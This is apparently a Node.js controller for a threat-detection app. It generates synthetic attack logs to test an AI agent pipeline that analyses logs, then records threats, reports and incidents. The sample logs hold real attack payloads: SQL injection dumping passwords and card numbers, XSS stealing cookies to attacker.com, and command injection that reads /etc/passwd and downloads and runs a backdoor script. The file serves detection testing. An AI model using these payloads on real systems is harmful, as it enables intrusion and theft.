const Threat = require("../models/Threat");
const Log = require("../models/Log");
const Report = require("../models/Report");
const Incident = require("../models/Incident");
const { orchestrateAnalysis } = require("../agents/AgentOrchestrator");

// Synthetic raw log generators for controlled test lab scenarios
const getSyntheticLogPayload = (attackType) => {
  const ts = new Date().toISOString();
  switch (attackType) {
    case "SSH Brute Force":
    case "Brute Force":
      return `
${ts} edge-gateway sshd[3120]: Failed password for invalid user admin from 198.51.100.45 port 41201 ssh2
${ts} edge-gateway sshd[3122]: Failed password for invalid user root from 198.51.100.45 port 41203 ssh2
${ts} edge-gateway sshd[3125]: Failed password for invalid user deploy from 198.51.100.45 port 41205 ssh2
${ts} edge-gateway sshd[3128]: Failed password for invalid user operator from 198.51.100.45 port 41207 ssh2
${ts} edge-gateway sshd[3130]: Failed password for root from 198.51.100.45 port 41209 ssh2
${ts} edge-gateway sshd[3132]: error: maximum authentication attempts exceeded for root from 198.51.100.45 port 41209 ssh2
`.trim();

    case "SQL Injection":
    case "SQL Injection Payload":
      return `
198.51.100.112 - - [${ts}] "GET /api/v1/users?id=1%20UNION%20SELECT%20username,password,credit_card%20FROM%20users-- HTTP/1.1" 200 4820 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
198.51.100.112 - - [${ts}] "GET /api/v1/auth?user=admin%27%20OR%20%271%27=%271 HTTP/1.1" 401 512 "-" "sqlmap/1.6.12"
`.trim();

    case "Port Scan":
    case "Port Scanning":
    case "Network Port Sweep":
      return `
198.51.100.77 - - [${ts}] connection refused on port 21 (FTP) - SYN scan probe
198.51.100.77 - - [${ts}] connection refused on port 22 (SSH) - SYN scan probe
198.51.100.77 - - [${ts}] connection refused on port 23 (Telnet) - SYN scan probe
198.51.100.77 - - [${ts}] connection refused on port 3306 (MySQL) - SYN scan probe
198.51.100.77 - - [${ts}] connection refused on port 8080 (HTTP-Alt) - Nmap script scan probe
`.trim();

    case "XSS":
    case "XSS Injection":
    case "Reflected XSS Injection":
      return `
198.51.100.90 - - [${ts}] "GET /search?q=%3Cscript%3Edocument.location=%27http://attacker.com/steal?cookie=%27+document.cookie%3C/script%3E HTTP/1.1" 200 1024
198.51.100.90 - - [${ts}] "POST /comments HTTP/1.1" 200 350 "payload=<svg/onload=alert(document.domain)>"
`.trim();

    case "Command Injection":
    case "Command Injection Attempt":
      return `
198.51.100.44 - - [${ts}] "POST /tools/ping HTTP/1.1" 200 512 "host=127.0.0.1; cat /etc/passwd | /bin/sh"
198.51.100.44 - - [${ts}] "GET /cgi-bin/test.sh?cmd=wget%20http://198.51.100.44/backdoor.sh%20-O%20/tmp/bd;%20chmod%20+x%20/tmp/bd;%20/bin/bash%20/tmp/bd HTTP/1.1" 200 2048
`.trim();

    default:
      return `
127.0.0.1 - - [${ts}] "GET /health HTTP/1.1" 200 24 "-" "HealthChecker/1.0"
`.trim();
  }
};

const generateTestAttack = async (req, res) => {
  try {
    const { attackType } = req.body;
    const requestedType = attackType || "SQL Injection";

    // 1. Generate synthetic raw log text
    const syntheticLog = getSyntheticLogPayload(requestedType);

    // 2. Feed the synthetic log directly through the real AgentOrchestrator pipeline!
    const analysisResult = await orchestrateAnalysis(syntheticLog, {
      fileFormat: ".log",
      originalName: `Controlled_Simulation_${requestedType.replace(/\s+/g, "_")}.log`,
    });

    const hasThreat = analysisResult.isThreat === true;

    // 3. Create simulated Log document in MongoDB
    const log = await Log.create({
      filename: `controlled_test_${requestedType.toLowerCase().replace(/\s+/g, "_")}_${Date.now()}.log`,
      originalName: `Controlled_Simulation_${requestedType.replace(/\s+/g, "_")}.log`,
      fileSize: Buffer.byteLength(syntheticLog, 'utf8'),
      fileFormat: ".log",
      uploadedBy: req.user.id,
      status: "Completed",
      threatCount: hasThreat ? 1 : 0,
    });

    let threat = null;
    let incident = null;

    if (hasThreat) {
      // 4. Create Threat document from real multi-agent calculation
      threat = await Threat.create({
        threatType: `${analysisResult.threatType} [Controlled Simulation]`,
        severity: analysisResult.severity,
        confidence: analysisResult.confidence,
        confidenceReason: analysisResult.confidenceReason,
        matchedIndicators: analysisResult.matchedIndicators,
        description: `[Controlled Simulation] ${analysisResult.description}`,
        recommendation: analysisResult.recommendation,
        mitreTechnique: analysisResult.mitreTechnique,
        sourceIp: analysisResult.sourceIp,
        status: "Active",
        logId: log._id,
      });

      log.analysis = threat._id;
      await log.save();
    }

    // 5. Create associated Report
    const report = await Report.create({
      title: `Controlled Security Test - ${requestedType}`,
      generatedBy: req.user.id,
      logId: log._id,
      summary: hasThreat
        ? `Controlled validation test for ${requestedType} parsed and classified with ${analysisResult.confidence}% calculated confidence. Matched indicators: ${(analysisResult.matchedIndicators || []).join('; ')}.`
        : `Controlled validation run for ${requestedType} evaluated. No malicious signatures triggered.`,
      threatCount: hasThreat ? 1 : 0,
      criticalCount: hasThreat && analysisResult.severity === "Critical" ? 1 : 0,
      status: "Generated",
    });

    // 6. If High or Critical, create initial Incident record for triage
    if (hasThreat && (analysisResult.severity === "High" || analysisResult.severity === "Critical")) {
      incident = await Incident.create({
        incidentId: `INC-${Math.floor(1000 + Math.random() * 9000)}`,
        title: `${analysisResult.threatType} [Controlled Sandbox]`,
        severity: analysisResult.severity,
        status: "Open",
        assignedTo: req.user.id,
        threatId: threat._id,
        logId: log._id,
      });
    }

    return res.status(201).json({
      success: true,
      message: `Controlled test simulation for ${requestedType} processed through AgentOrchestrator pipeline.`,
      test: {
        attackType: requestedType,
        environment: "Controlled Test Lab Sandbox",
        detected: hasThreat,
        detectionStatus: hasThreat ? "Detected & Linked" : "Clean Baseline",
      },
      log,
      threat,
      report,
      incident,
      agentTelemetry: analysisResult.agentTelemetry,
    });
  } catch (error) {
    console.error("Generate Test Attack Error:", error);
    return res.status(500).json({
      success: false,
      message: "Unable to run security test simulation.",
    });
  }
};

module.exports = {
  generateTestAttack,
};